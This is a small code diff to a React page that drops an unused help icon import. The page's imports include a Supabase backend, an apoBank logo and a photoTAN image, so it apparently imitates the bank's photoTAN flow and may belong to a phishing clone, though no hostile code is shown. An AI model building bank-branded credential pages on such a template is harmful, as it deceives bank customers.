@@ -1,6 +1,6 @@
 import { useEffect, useMemo, useState } from "react";
 import { useNavigate, useParams } from "react-router-dom";
-import { ChevronRight, HelpCircle, Phone, ShieldCheck } from "lucide-react";
+import { ChevronRight, Phone, ShieldCheck } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import phototanImg from "@/assets/phototan.png";
